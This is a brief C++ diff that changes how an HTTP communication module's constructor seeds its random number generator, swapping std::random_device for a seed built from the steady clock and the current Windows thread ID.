@@ -1,5 +1,6 @@
 #include <iostream>
 #include <string>
+#include <chrono>
 #include "HTTPCommunicationModule.h"
 #include "Helpers.h"
 
@@ -7,7 +8,9 @@
 HTTPCommunicationModule::HTTPCommunicationModule(const std::string& address, int port, Agent& agent_ref)
 	: Address(address), Port(port), httpClient(), running(false), agent(agent_ref),
 	  hStopEvent(CreateEvent(NULL, TRUE, FALSE, NULL)),
-	  rng(std::random_device{}())
+	  rng(static_cast<unsigned>(
+	        std::chrono::steady_clock::now().time_since_epoch().count()
+	        ^ GetCurrentThreadId()))
 {
 }
 
